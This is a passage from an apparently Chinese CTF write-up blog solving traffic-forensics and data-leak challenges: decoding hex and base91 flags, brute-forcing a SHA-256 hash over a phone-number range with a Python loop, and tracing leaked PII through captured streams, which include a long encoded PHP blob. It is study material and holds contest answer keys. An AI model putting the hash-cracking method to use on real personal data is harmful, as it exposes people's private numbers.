class="line">89504e470d0a1a0a0000000d49484452000001530000008b0803000000eb8f8ab0000000ba504c5445ffffff0000006600003a000066b6ffffffb600003affffdb90dbffffdb90dbffff3a90dbb66600903a00dbdbdb0066b6003a90db903a000066b6ffffffb666666666b6dbff003a66003a3affdbdbffdbb6b6b6b63a6690dbb666663a0066b6db3a666690663a3a3a00663a3a3a3a3a3a3a66b6663adbdbff66663a90b6dbdb90666690dbdbffb6dbb690aab6903a9090dbffdbb6c9dbdbb6b666b6b66690b63a66b66690909090669066663a90b6dbdb90b69090b6906690903a2e9a24be0000049a4944415478daed990973d3301085bd18ec24360981380929490a252d1428f70dffff6f513d4b2caa88308763cff0be993a96e55d3dbdda3ac609218410420821841042082184104208218410420821841042082184104208218410420821841042082184104208218490ff93bb4747f3e4ee38690524c6f13f223f1591c98d6b72bdc9cde66f3c1ef9a6c5fc42621c7f5f19daf97bf2574747673843be033095ecdec59b469d5ea7d920494a915b3f881ba6920d5af1b49449f2f7ac366258dc3152b36dd23ae86d9134ebf44ce4de1c9eaa89a6d86f4fa7b27c77f108cfc1eabe4046bbe07f3768e869298535119d75f13df7f47c5b3f0f10308da4ecc2d3fc66ed5d29c726461f83b4d79e3af110304c75d8525af5349c72cc7c1478faf1a614df2dcb2e90c1c58efc60cfd33c329b8db52ef0149947f617b34d4c695884ce83793a13900dea36cd8863b857379cdf47e1695da79e1633b97dc725b8f5c97a9a7f493119a0e007a34bf564f17684aed9f829a63b7baf14a1a775e870538b7a969a06e6495c29d632aa044071379e96921d572718d0d11b59540f64995ef51477bb57ca3de91b9165f54804555e304aafafc9719522b5ef296ad1ec3e4fdfa526934cd692551b813b31a590727c5944010c51d1cdbb7f6a07f46c00bf6ecf6b3d573d8517eedf6f32e0327ef2320c46fa3a628aa2e7a939a2989fedf1548a3a522623d3e42f9596c8ead2a202293af1144063e1c45b1f708b7a6aa3f41c77bbe0894d6b98594fd13fd75fdf5398a7849ec207a4b0f9e34ad1b6f609966eddb08a1c01ed7b7ac328b5fdd5ba35caf0d1f517de2083de8d333f18c74207b6f039cd06114f110a2ff5724c29164c56a91a0f701ad2aea7abf7270f44446db37546cd62a04a4d98bd454fd5353fd81eb5bd703c95ddcbfd9e5e7776e8e5b8d2ec21105c476bbaab428b016d8ea722b2dc55a914da0755aa9ea216a381cd80b27a8a62434fdd24bedc36f6f4574a1da1a7c3037b8a97700bf98152e395befbd63938d2d8d3bdefbee1ee692a5234f534a6d414df8e2da34427029bc48405b4e6a913875f6877b7047314025e636fe2de7d7f3cf58331286aad6b54a3d0a871bb99a751a528067435476103e7961e3a734c83b594db94c21037ef9b236e0b83dde48d9389f3492f8359734fe34a2125a09bb514a6d611d44ba11d5e4be8a95b37ba0cba46cc4b58e307bb9b75f56a6a4d09bf9fe730a4b9a751a52822e3ea4d02d6bb41679e26536c85d2c5c60e99f576e4f9b5c05303ccf332c8e23218a6f9c1a8ac2433b552d4b5661b94defe0a33cacbc0eae477c6d3b8d2592ab2abaa14f146205ae96acd7f9e9a6df30b2b7f6d4ad9931b81a736b2d00cba69dfe111f183911e17168f13708ec2dcad4f0d4b5435f234aa142b262745c71bf5f4e098b9d2ff2e02d3d4d378f0d80fbe5a7db6af8066ff8d52907b524c4bea691fc0e4611fd07e03a5f11b26491fc0a650bf9df418288db0ba8fb55687e41f1e43083650fa8daf87784a23e01b5f9760a1b27c988a6407fadfe2abb1e365bf95fe29cf4ee492ec60ef3b6668c7ad51af951242082184104208218410420821841042082184104208218410420821841042082184104208218410420821e4a77c030fc7566d992e0e920000000049454e44ae426082</span><br></pre></td></tr></table></figure><p>保存出来得到图片，图片就是flag。</p><h3 id="协议分析1"><a href="#协议分析1" class="headerlink" title="协议分析1"></a>协议分析1</h3><p>排序发现异常，追踪流定位到特殊字符，随波一把梭base91</p><p>@iH&lt;,{Mu[8c*{Z&amp;SHjB2F}A</p><p>flag{3XZGqNB5xlf6}</p><h3 id="通信流量"><a href="#通信流量" class="headerlink" title="通信流量"></a>通信流量</h3><p>过滤sip，得到：</p><p>本期推送的平台所需口令为china@iisc</p><p>flag{china@iisc}</p><h3 id="ezhash"><a href="#ezhash" class="headerlink" title="ezhash"></a>ezhash</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import hashlib</span><br><span class="line">kay=&quot;2704efd1382cb3c01cb7962e5b8b06d5dcbe427a61460fb333e126fb646dc108&quot;</span><br><span class="line">for i in range(100000000):</span><br><span class="line">    flag=8613900000000</span><br><span class="line">    phone=flag+i</span><br><span class="line">    print(phone)</span><br><span class="line">    sha=hashlib.sha256(str(phone).encode()).hexdigest()</span><br><span class="line">    if kay==sha:</span><br><span class="line">        print(phone)</span><br><span class="line">        break</span><br></pre></td></tr></table></figure><p>爆破得到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;8613984594729&#125;</span><br></pre></td></tr></table></figure><h2 id="2022年首届数据安全大赛"><a href="#2022年首届数据安全大赛" class="headerlink" title="2022年首届数据安全大赛"></a>2022年首届数据安全大赛</h2><p><a href="/image/media/2022/ctf/2022.10/10%E6%9C%88%E6%AF%94%E8%B5%9B%E9%99%84%E4%BB%B6/%E9%A6%96%E5%B1%8A%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B.zip">首届数据安全大赛</a></p><p>BlueTeam附件:<a href="https://pan.baidu.com/share/init?surl=yV77UTnBMgscIU2rEND6VQ">https://pan.baidu.com/share/init?surl=yV77UTnBMgscIU2rEND6VQ</a> 提取码（GAME）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">比赛地址：https://ctf.ichunqiu.com/ds-contest</span><br></pre></td></tr></table></figure><h3 id="泄露溯源定位-1"><a href="#泄露溯源定位-1" class="headerlink" title="泄露溯源定位.1"></a>泄露溯源定位.1</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">泄露信息是被哪个账号获取的？（答案参考格式：abcABC123）</span><br></pre></td></tr></table></figure><p>根据流量包追踪TCP流，在11发现了数据库的数据和敏感数据手机号等，确定名称：datauser3</p><h3 id="泄露溯源定位-2"><a href="#泄露溯源定位-2" class="headerlink" title="泄露溯源定位.2"></a>泄露溯源定位.2</h3><p>github搜索datauser3，在code部分找到相关的信息</p><p><a href="https://github.com/Tristan-Hao/Green-Berry/blob/f766064e4f9c38bf4aefa06fd3d4abbda7fe4914/catalogue.py">Green-Berry/catalogue.py at f766064e4f9c38bf4aefa06fd3d4abbda7fe4914 · Tristan-Hao/Green-Berr</a></p><p>然后改成指定格式</p><p><a href="https://github.com/Tristan-Hao/Green-Berry/blob/main/catalogue.py">https://github.com/Tristan-Hao/Green-Berry/blob/main/catalogue.py</a></p><h3 id="泄露溯源定位-3"><a href="#泄露溯源定位-3" class="headerlink" title="泄露溯源定位.3"></a>泄露溯源定位.3</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&gt; 除题目中给出的敏感信息外，还有哪些PII数据被获取，选择你所发现的敏感类型（ ）。</span><br><span class="line">&gt; A. 地址</span><br><span class="line">&gt; B. 国籍</span><br><span class="line">&gt; C. 年龄</span><br><span class="line">&gt; D. 银行卡号</span><br><span class="line">&gt; E. 邮件地址</span><br><span class="line">&gt; F. IMSI</span><br><span class="line">&gt; G. IMEI</span><br><span class="line">&gt; H. 学历</span><br><span class="line">&gt; （请按字母顺序填写选项，答案参考格式：ABD）</span><br></pre></td></tr></table></figure><p>tcp流11下面的数据部分有加密方式，aes后面aa01是他的密钥</p><p>在线解密结果如下，即ADEG</p><h3 id="SQLpacket-1"><a href="#SQLpacket-1" class="headerlink" title="SQLpacket.1"></a>SQLpacket.1</h3><p>公司服务器被黑客入侵了，数据源码丢失，不过还好有混淆，希望黑客破解不了。黑客看到的secret的文件名是？（答案参考格式：1.txt）</p><p>tcp流185能够看到数据文件</p><h3 id="SQLpacket-2"><a href="#SQLpacket-2" class="headerlink" title="SQLpacket.2"></a>SQLpacket.2</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">黑客窃取的源码中secret1的值（答案参考格式：b9adada3-7dc3-4b74-aa60-3dd254fd4fac）</span><br></pre></td></tr></table></figure><p>tcp.stream eq 197找一个http的流追http得</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">M0MzRjcwNjg3MDIwMEQwQTY5NjYyMDI4MjE2NDY1NjY2OTZFNjU2NDI4MjI0MzQxNDM0NDQzNDE0MTQzNDE0MzQzNDU0MjQyNDE0NDQxNDU0MjQzNDUyMjI5Mjk3QjY0NjU2NjY5NkU2NTI4MjI0MzQxNDM0NDQzNDE0MTQzNDE0MzQzNDU0MjQyNDE0NDQxNDU0MjQzNDUyMjJDMjA1RjVGNDY0OTRDNDU1RjVGMjkzQjY3NkM2RjYyNjE2QzIwMjRFRkJGQkQyQzI0RUZCRkJERUZCRkJEMkMyNEVGQkZCREVGQkZCREVGQkZCRDJDMjRFRkJGQkRFRkJGQkRFRkJGQkRFRkJGQkQyQzI0RUZCRkJERUZCRkJERUZCRkJERUZCRkJERUZCRkJEMkMyNEVGQkZCREVGQkZCREVGQkZCREVGQkZCREVGQkZCREVGQkZCRDJDMjRFRkJGQkRFRkJGQkRFRkJGQkRFRkJGQkRFRkJGQkRFRkJGQkRFRkJGQkQyQzI0RUZCRkJERUZCRkJERUZCRkJERUZCRkJERUZCRkJERUZCRkJERUZCRkJERUZCRkJEMkMyNEVGQkZCREVGQkZCREVGQkZCREVGQkZCREVGQkZCREVGQkZCREVGQkZCREVGQkZCREVGQkZCRDJDMjRFRkJGQkRFRkJGQkQ3RkVGQkZCREVGQkZCREVGQkZCREVGQkZCREVGQkZCREVGQkZCREVGQkZCRDJDMjRFRkJGQkRFRkJGQkRFRkJGQkRFRkJGQkRFRkJGQkRFRkJGQkRFRkJGQkRFRkJGQkRFRkJGQkRFRkJGQkRFRkJGQkQyQzI0RUZCRkJERUZCRkJERUZCRkJERUZCRkJERUZCRkJERUZCRkJERUZCRkJERUZCRkJERUZCRkJERUZCRkJERUZCRkJERUZCRkJEMkMyNEVGQkZCREVGQkZCREVGQkZCREVGQkZCREVGQkZCREVGQkZCREVGQkZCREVGQkZCREVGQkZCREVGQkZCREVGQkZCRDdGRUZCRkJEMkMyNEVGQkZCREVGQkZCREVGQkZCREVGQkZCREVGQkZCREVGQkZCREVGQkZCREVGQkZCREVGQkZCREVGQkZCREVGQkZCREVGQkZCREVGQkZCREVGQkZCRDJDMjRFRkJGQkRFRkJGQkRFRkJGQkRFRkJGQkRFRkJGQkRFRkJGQkRFRkJGQkQ3RkVGQkZCREVGQkZCREVGQkZCREVGQkZCREVGQkZCREVGQkZCREVGQkZCRDJDMjRFRkJGQkRFRkJGQkRFRkJGQkRFRkJGQkRFRkJGQkRFRkJGQkRFRkJGQkRFRkJGQkRFRkJGQkRFRkJGQkRFRkJGQkRFRkJGQkRFRkJGQkRFRkJGQkRFRkJGQkRFRkJGQkQzQjY2NzU2RTYzNzQ2OTZGNkUyMEVGQkZCREVGQkZCRDI4MjRFRkJGQkRFRkJGQkQyQzI0RUZCRkJERUZCRkJERUZCRkJEM0QyMjIyMjk3QjY3NkM2RjYyNjE2QzIwMjRFRkJGQkQyQzI0RUZCRkJERUZCRkJEMkMyNEVGQkZCREVGQkZCREVGQkZCRDJDMjRFRkJGQkRFRkJGQkRFRkJGQkRFRkJGQkQyQzI0RUZCRkJERUZCRkJERUZCRkJERUZCRkJERUZCRkJEMkMyNEVGQkZCREVGQkZCREVGQkZCREVGQkZCREVGQkZCREVGQkZCRDJDMjRFRkJGQkRFRkJGQkRFRkJGQkRFRkJGQkRFRkJGQkRFRkJGQkRFRkJGQkQyQzI0RUZCRkJERUZCRkJERUZCRkJERUZCRkJERUZCRkJERUZCRkJERUZCRkJERUZCRkJEMkMyNEVGQkZCREVGQkZCREVGQkZCREVGQkZCREVGQkZCREVGQkZCREVGQkZCREVGQkZCREVGQkZCRDJDMjRFRkJGQkRFRkJGQkQ3RkVGQkZCREVGQkZCREVGQkZCREVGQkZCREVGQkZCREVGQkZCREVGQkZCRDJDMjRFRkJGQkRFRkJGQkRFRkJGQkRFRkJGQkRFRkJGQkRFRkJGQkRFRkJGQkRFRkJGQkRFRkJGQkRFRkJGQkRFRkJGQkQyQzI0RUZCRkJERUZCRkJERUZCRkJERUZCRkJERUZCRkJERUZCRkJERUZCRkJERUZCRkJERUZCRkJERUZCRkJERUZCRkJERUZCRkJEMkMyNEVGQkZCREVGQkZCREVGQkZCREVGQkZCREVGQkZCREVGQkZCREVGQkZCREVGQkZCREVGQkZCREVGQkZCREVGQkZCRDdGRUZCRkJEMkMyNEVGQkZCREVGQkZCREVGQkZCREVGQkZCREVGQkZCREVGQkZCREVGQkZCREVGQkZCREVGQkZCREVGQkZCREVGQkZCREVGQkZCREVGQkZCREVGQkZCRDJDMjRFRkJGQkRFRkJGQkRFRkJGQkRFRkJGQkRFRkJGQkRFRkJGQkRFRkJGQkQ3RkVGQkZCREVGQkZCREVGQkZCREVGQkZCREVGQkZCREVGQkZCREVGQkZCRDJDMjRFRkJGQkRFRkJGQkRFRkJGQkRFRkJGQkRFRkJGQkRFRkJGQkRFRkJGQkRFRkJGQkRFRkJGQkRFRkJGQkRFRkJGQkRFRkJGQkRFRkJGQkRFRkJGQkRFRkJGQkRFRkJGQkQzQjY5NjYyODY1NkQ3MDc0NzkyODI0RUZCRkJERUZCRkJERUZCRkJEMjkyOTdCNzI2NTc0NzU3MjZFMjA2MjYxNzM2NTM2MzQ1RjY0NjU2MzZGNjQ2NTI4MjRFRkJGQkRFRkJGQkQyOTNCN0Q2NTZDNzM2NTdCNzI2NTc0NzU3MjZFMjBFRkJGQkRFRkJGQkQyODI0RUZCRkJERUZCRkJERUZCRkJERUZCRkJERUZCRkJERUZCRkJEMjgyNEVGQkZCREVGQkZCRDJDMjRFRkJGQkRFRkJGQkRFRkJGQkQyQzI0RUZCRkJEMjgyNEVGQkZCREVGQkZCREVGQkZCRDI5MjkyOTNCN0Q3RDI0RUZCRkJEM0RFRkJGQkRFRkJGQkQyODIyNjMzMzUyNzk2MzZENTYzMkVGQkZCRDIyMjkzQjI0RUZCRkJERUZCRkJERUZCRkJERUZCRkJERUZCRkJERUZCRkJEM0RFRkJGQkRFRkJGQkQyODIyNjMzMzUyNzk2NDQ4NDkzREVGQkZCRDIyMjkzQjI0RUZCRkJERUZCRkJEM0RFRkJGQkRFRkJGQkQyODIyNUEzMjQ5N0E0QzU3NDkzMDRDNkQ0RDdBNEM2RDU2NjlFRkJGQkQ0RTU3NEU2QzRGNTc0NTM1NTk2RDU2Njk0RTZBNEQ3N0VGQkZCRDU5NTQ2Qjc4NTkzMjU2NkQ0RDMyNTkzNTVBMzI1NTNERUZCRkJEMjIyQzIyNEM2QTQ3NzI0QjUwNTQ1QTIyMjkzQjI0RUZCRkJERUZCRkJERUZCRkJERUZCRkJERUZCRkJERUZCRkJERUZCRkJEM0RFRkJGQkRFRkJGQkQyODIyNDkzMzcwMzE2MjQ3NEU3NjYyNTg0Mjc5NDlFRkJGQkQ1ODRFN0FFRkJGQkQyMjJDMjI1QTczNEE0NzZENDg2NzQ5MjIyOTNCMjRFRkJGQkRFRkJGQkRFRkJGQkRFRkJGQkRFRkJGQkRFRkJGQkRFRkJGQkRFRkJGQkRFRkJGQkQzREVGQkZCREVGQkZCRDI4MjI1NDZENDY3QTVBNTk1NDMwNTgzMjUyNkM1NDMyMzk2QkVGQkZCRDVBNTEzRDNERUZCRkJEMjIyQzIyNTk2ODc3NDI1NDIyMjkzQjI0RUZCRkJERUZCRkJERUZCRkJERUZCRkJERUZCRkJERUZCRkJERUZCRkJERUZCRkJERUZCRkJERUZCRkJERUZCRkJEN0ZFRkJGQkQzREVGQkZCREVGQkZCRDI4MjI2QjU4NkI2ODYyNDEzRDNERUZCRkJEMjIyQzIyNUE3NzdBNEQ2QjIyMjkzQjI0RUZCRkJERUZCRkJERUZCRkJERUZCRkJERUZCRkJERUZCRkJERUZCRkJERUZCRkJERUZCRkJERUZCRkJERUZCRkJERUZCRkJERUZCRkJERUZCRkJERUZCRkJERUZCRkJEM0RFRkJGQkRFRkJGQkQyODIyNUE0ODRBNkM2MzMxMzk3OTYzNTg0MjczNTk1NzdGNEU2Q0VGQkZCRDIyMkMyMjYzNDE2NzRCNjk1QTIyMjkzQjY2NzU2RTYzNzQ2OTZGNkUyMEVGQkZCREVGQkZCREVGQkZCREVGQkZCRDI4MjYyNEVGQkZCREVGQkZCREVGQkZCREVGQkZCRDI5N0I2NzZDNkY2MjYxNkMyMDI0RUZCRkJEMkMyNEVGQkZCREVGQkZCRDJDMjRFRkJGQkRFRkJGQkRFRkJGQkQyQzI0RUZCRkJERUZCRkJERUZCRkJERUZCRkJEMkMyNEVGQkZCREVGQkZCREVGQkZCREVGQkZCREVGQkZCRDJDMjRFRkJGQkRFRkJGQkRFRkJGQkRFRkJGQkRFRkJGQkRFRkJGQkQyQzI0RUZCRkJERUZCRkJERUZCRkJERUZCRkJERUZCRkJERUZCRkJERUZCRkJEMkMyNEVGQkZCREVGQkZCREVGQkZCREVGQkZCREVGQkZCREVGQkZCREVGQkZCREVGQkZCRDJDMjRFRkJGQkRFRkJGQkRFRkJGQkRFRkJGQkRFRkJGQkRFRkJGQkRFRkJGQkRFRkJGQkRFRkJGQkQyQzI0RUZCRkJERUZCRkJEN0ZFRkJGQkRFRkJGQkRFRkJGQkRFRkJGQkRFRkJGQkRFRkJGQkRFRkJGQkQyQzI0RUZCRkJERUZCRkJERUZCRkJERUZCRkJERUZCRkJERUZCRkJERUZCRkJERUZCRkJERUZCRkJERUZCRkJERUZCRkJEMkMyNEVGQkZCREVGQkZCREVGQkZCREVGQkZCREVGQkZCREVGQkZCREVGQkZCREVGQkZCREVGQkZCREVGQkZCREVGQkZCREVGQkZCRDJDMjRFRkJGQkRFRkJGQkRFRkJGQkRFRkJGQkRFRkJGQkRFRkJGQkRFRkJGQkRFRkJGQkRFRkJGQkRFRkJGQkRFRkJGQkQ3RkVGQkZCRDJDMjRFRkJGQkRFRkJGQkRFRkJGQkRFRkJGQkRFRkJGQkRFRkJGQkRFRkJGQkRFRkJGQkRFRkJGQkRFRkJGQkRFRkJGQkRFRkJGQkRFRkJGQkRFRkJGQkQyQzI0RUZCRkJERUZCRkJERUZCRkJERUZCRkJERUZCRkJERUZCRkJERUZCRkJEN0ZFRkJGQkRFRkJGQkRFRkJGQkRFRkJGQkRFRkJGQkRFRkJGQkRFRkJGQkQyQzI0RUZCRkJERUZCRkJERUZCRkJERUZCRkJERUZCRkJERUZCRkJERUZCRkJERUZCRkJERUZCRkJERUZCRkJERUZCRkJERUZCRkJERUZCRkJERUZCRkJERUZCRkJERUZCRkJEM0IyNEVGQkZCREVGQkZCREVGQkZCREVGQkZCREVGQkZCREVGQkZCREVGQkZCREVGQkZCREVGQkZCREVGQkZCREVGQkZCREVGQkZCREVGQkZCREVGQkZCREVGQkZCREVGQkZCREVGQkZCRDNERUZCRkJERUZCRkJEMjgyMjY1NDc2QzZDRUZCRkJEMjIyQzIyNUE3OTU0NjQ3MjUwNkE2NTIyMjkzQjQwMjRFRkJGQkRFRkJGQkRFRkJGQkRFRkJGQkRFRkJGQkRFRkJGQkRFRkJGQkRFRkJGQkRFRkJGQkRFRkJGQkRFRkJGQkRFRkJGQkRFRkJGQkRFRkJGQkRFRkJGQkRFRkJGQkQyODI0RUZCRkJERUZCRkJEMkMyNEVGQkZCREVGQkZCREVGQkZCREVGQkZCREVGQkZCREVGQkZCREVGQkZCREVGQkZCREVGQkZCREVGQkZCREVGQkZCRDdGRUZCRkJEMkUyMjI4NDAyNEVGQkZCREVGQkZCREVGQkZCREVGQkZCREVGQkZCREVGQkZCREVGQkZCRDI4MjRFRkJGQkRFRkJGQkRFRkJGQkRFRkJGQkRFRkJGQkRFRkJGQkRFRkJGQkRFRkJGQkRFRkJGQkQyODI3NjU0RTcwNjQ2QjZEMzE3NjZENkM0MTU1NzgzN0VGQkZCRDJCNEI0OTYyNzk0MTZBNEM1OTY5NEY2QTU4NkRFRkJGQkQ1QTY3Mzk0QTc1MzgzNTRENkE2MzMyNTkzNDRDRUZCRkJENTk1OTczNDQ2ODUyNzE0MzMxMzI1MjU2MzI2MkVGQkZCRDRCNkI3MTY0NjQ2RDQ0NzI1NTM5NTc0QjM4NkNFRkJGQkQ0NTQ4NDYzMjc2NjM1ODc0MzU3QTY2NzU2NDJGRUZCRkJEN0E3NjZENjY2OTMzNUEzMDQ1MzQ3ODczNDQ0QkVGQkZCRDZDNTE1ODM4NTE0QjY0NTY0Qzc2NDk3NzUzNTNFRkJGQkQ3MDM2NzQ3OTM0NzE3OTQzMzQ0NDQ3MzAyQjYxRUZCRkJENzk3NjU5NUEzNjU3NkI3NzZENjU1MzZCNzE0N0VGQkZCRDZCMzgzODZENzI3NTRCNEU0Qjc1MzM2RDY2NzdFRkJGQkQyQjZENzc3ODU5NDU0NzcwNkM1MTY3NTc1ODY5RUZCRkJENjQ1QTU5NzA3NDM0NDg2QzU1NDY3Nzc0NDk1M0VGQkZCRDcxNzAzNDc3NjI0NTZDNzU2MTc5NjI2MjYyMzZFRkJGQkQ2QjQ2NTQ1MDM0Njg0QjYyNTM1MTRENkY2NDU4RUZCRkJENkE0MjRCNEI3MTRDNTQ1MDU4NjIzNTc2NEUzNEVGQkZCRDMxNjQ1MzM3NkU3NDc4Nzg1MDRBNTU2QzZGMzVFRkJGQkQ2MzczNjMzMTRDNjkzMzZCMzA0MTMwNEU3QTQyRUZCRkJEMzY3MTZDMzAyQjYxNjYzMDQ3NTc3MTc1NEY3OUVGQkZCRDMzNTQ1NzQ2NzYzOTM5NjgzODQ0NTY2OTY4NzlFRkJGQkQ1NjQ2NTU3OTUxNTUyQjMyNkY3NTU5NTY0NjdBRUZCRkJENEEzNzQ0Nzg0RTZBMzc0QTQ0NjQzMjUyNjg1M0VGQkZCRDcyNDM3ODU2NTc1MzVBMzU0QzczNjczMDM2NENFRkJGQkQ2QzZCMzQzNjZBNDk3NTcxNTMzMjYxNkU1ODM3RUZCRkJENjcyQjZENkI2NTY0MkI2NTUwNEY3MTUxMzU1QUVGQkZCRDY5Njk3OTZFMkI0OTZDNzI2QjMwNDE0MTc1NThFRkJGQkQ0QzU5NkQ3MDczNkM1MjZFNEY1QTY2NzY0QzRFRUZCRkJENUE3QTYyNjQ2MTJGNjY2MjU0NjE1MTM5NEY1OUVGQkZCRDc3NkY0QTYxNjg2OTVBNDg0NDczNjk2RTM0N0FFRkJGQkQyQjRCNEE1QTQ3NzU3NTY1NDQ0OTQyNzI2RTYzN0YzMDYzNjQ1MDY4Mzc2QzYzNTQ0Mzc4Njc0RjM0RUZCRkJENzQ2OTc5NDE0NzMyMkYyQjZGNEUyRjY3MzAzN0VGQkZCRDUxNDE2OTQ4NDkzOTQzMzc3NDU5MzM2QTc2MzZFRkJGQkQ0NDcyNEU2RTQyNjY1ODM4NkU3NjczNTI3NDQyRUZCRkJENzE2NzcyNjIzNDRENjk0RjMzNjE0NDMzNzkzOUVGQkZCRDM1NkI2MjQ0NkQ3NjQ4NTI0RDc3NkE3OTQyMzhFRkJGQkQ2OTRENEE3NjU0MkI0RDY3NEMzOTM1NkE0QzMxRUZCRkJENTg0NTUwMzYzNTczNzk3NjQ0NEU3MzYyNjU1NUVGQkZCRDc1MzY0QTc1NTk2ODczNUE1OTY5Mzk0MTM0NjdFRkJGQkQ0MjM0NkY2NjM5NTc3ODdBNjI1MjQ4NjQ3MDUwRUZCRkJEMzc0NjQ1NDI2NjQyMkY0QTUyNzc0QjY4NDU0MkVGQkZCRDZCNEE1Mjc3NTA0MjUzNDk1MTcxNjM0QjY1NkVFRkJGQkQ3MjM4NTAyQjYzNDM0NTYxNDM2NjY3NEM1OTVBRUZCRkJEMzQ1ODQ1NDM0QjQ5MzQzMTQ0NjI2NDMzMzM3NEVGQkZCRDUxNzc2NTY0Njg1ODQ4NTg2RDZBMkY0RTdBNUFFRkJGQkQ2QjJCNEU0QTJGNkQ0RTc1NUE0RTU5NTk0RjMzRUZCRkJENjE0RjY1Njg1QTM2MzM2RDU0Njc3NDRDMzA3QUVGQkZCRDU2NzQ0RDQ2NzA2RjczNDM1NTYzNjY0Mjc1NzlFRkJGQkQ3NzYxNTU2RjQzMzc0NDRCNzcyQjQ2NUE0MjRGRUZCRkJENzE2MzM1NEY1NzZCNzk2NzJCNUEzOTMzNTc0MkVGQkZCRDUzNTQ2MjYzMzczNTZFNEU3MTMxNjQ1Njc3NTRFRkJGQkQ0ODcxNEMzNjcxNDg0QjZBNDEzREVGQkZCRDI3MjkyOTI5M0IyMjJDMjJFRkJGQkRFRkJGQkRFRkJGQkQwRDBBRUZCRkJERUZCRkJERUZCRkJERUZCRkJERUZCRkJERUZCRkJENjIzMzY1NjIzNDY2NjMzMzY2NjU2MjM1NjM2NTM5NjEzOTYyNjU2MjM1MzMzMDYyMzkzMTYzNjU2NjMzNjYzOUVGQkZCREVGQkZCREVGQkZCREVGQkZCREVGQkZCREVGQkZCRDIyMjkzQjcyNjU3NDc1NzI2RTIwMjI2RjIyM0I3RDdENjU2QzczNjU3QjY3NkM2RjYyNjE2QzIwMjRFRkJGQkQyQzI0RUZCRkJERUZCRkJEMkMyNEVGQkZCREVGQkZCREVGQkZCRDJDMjRFRkJGQkRFRkJGQkRFRkJGQkRFRkJGQkQyQzI0RUZCRkJERUZCRkJERUZCRkJERUZCRkJERUZCRkJEMkMyNEVGQkZCREVGQkZCREVGQkZCREVGQkZCREVGQkZCREVGQkZCRDJDMjRFRkJGQkRFRkJGQkRFRkJGQkRFRkJGQkRFRkJGQkRFRkJGQkRFRkJGQkQyQzI0RUZCRkJERUZCRkJERUZCRkJERUZCRkJERUZCRkJERUZCRkJERUZCRkJERUZCRkJEMkMyNEVGQkZCREVGQkZCREVGQkZCREVGQkZCREVGQkZCREVGQkZCREVGQkZCREVGQkZCREVGQkZCRDJDMjRFRkJGQkRFRkJGQkQ3RkVGQkZCREVGQkZCREVGQkZCREVGQkZCREVGQkZCREVGQkZCREVGQkZCRDJDMjRFRkJGQkRFRkJGQkRFRkJGQkRFRkJGQkRFRkJGQkRFRkJGQkRFRkJGQkRFRkJGQkRFRkJGQkRFRkJGQkRFRkJGQkQyQzI0RUZCRkJERUZCRkJERUZCRkJERUZCRkJERUZCRkJERUZCRkJERUZCRkJERUZCRkJERUZCRkJERUZCRkJERUZCRkJERUZCRkJEMkMyNEVGQkZCREVGQkZCREVGQkZCREVGQkZCREVGQkZCREVGQkZCREVGQkZCREVGQkZCREVGQkZCREVGQkZCREVGQkZCRDdGRUZCRkJEMkMyNEVGQkZCREVGQkZCREVGQkZCREVGQkZCREVGQkZCREVGQkZCREVGQkZCREVGQkZCREVGQkZCREVGQkZCREVGQkZCREVGQkZCREVGQkZCREVGQkZCRDJDMjRFRkJGQkRFRkJGQkRFRkJGQkRFRkJGQkRFRkJGQkRFRkJGQkRFRkJGQkQ3RkVGQkZCREVGQkZCREVGQkZCREVGQkZCREVGQkZCREVGQkZCREVGQkZCRDJDMjRFRkJGQkRFRkJGQkRFRkJGQkRFRkJGQkRFRkJGQkRFRkJGQkRFRkJGQkRFRkJGQkRFRkJGQkRFRkJGQkRFRkJGQkRFRkJGQkRFRkJGQkRFRkJGQkRFRkJGQkRFRkJGQkQzQjI0RUZCRkJEM0RFRkJGQkRFRkJGQkQyODIyNjMzMzUyNzk2MzZENTYzMkVGQkZCRDIyMjkzQjI0RUZCRkJERUZCRkJERUZCRkJERUZCRkJERUZCRkJERUZCRkJEM0RFRkJGQkRFRkJGQkQyODIyNjMzMzUyNzk2NDQ4NDkzREVGQkZCRDIyMjkzQjI0RUZCRkJERUZCRkJEM0RFRkJGQkRFRkJGQkQyODIyNUEzMjQ5N0E0QzU3NDkzMDRDNkQ0RDdBNEM2RDU2NjlFRkJGQkQ0RTU3NEU2QzRGNTc0NTM1NTk2RDU2Njk0RTZBNEQ3N0VGQkZCRDU5NTQ2Qjc4NTkzMjU2NkQ0RDMyNTkzNTVBMzI1NTNERUZCRkJEMjIyQzIyNEM2QTQ3NzI0QjUwNTQ1QTIyMjkzQjI0RUZCRkJERUZCRkJERUZCRkJERUZCRkJERUZCRkJERUZCRkJERUZCRkJEM0RFRkJGQkRFRkJGQkQyODIyNDkzMzcwMzE2MjQ3NEU3NjYyNTg0Mjc5NDlFRkJGQkQ1ODRFN0FFRkJGQkQyMjJDMjI1QTczNEE0NzZENDg2NzQ5MjIyOTNCMjRFRkJGQkRFRkJGQkRFRkJGQkRFRkJGQkRFRkJGQkRFRkJGQkRFRkJGQkRFRkJGQkRFRkJGQkQzREVGQkZCREVGQkZCRDI4MjI1NDZENDY3QTVBNTk1NDMwNTgzMjUyNkM1NDMyMzk2QkVGQkZCRDVBNTEzRDNERUZCRkJEMjIyQzIyNTk2ODc3ND